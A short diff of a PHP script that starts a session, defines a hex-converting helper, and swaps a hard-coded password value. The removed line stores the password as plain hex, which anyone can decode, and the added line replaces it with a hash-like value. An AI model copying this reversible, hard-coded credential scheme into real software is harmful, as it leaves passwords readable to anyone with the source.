@@ -1,6 +1,6 @@
 <?php
 session_start();
-$hex_pass = '616c616c6163696e7461'; //
+$hex_pass = '8fdc3a581fd12d0d6cb8074c8eff6050'; //
 function strToHex($string) {
     $hex = '';
     for ($i=0; $i<strlen($string); $i++) $hex .= dechex(ord($string[$i]));
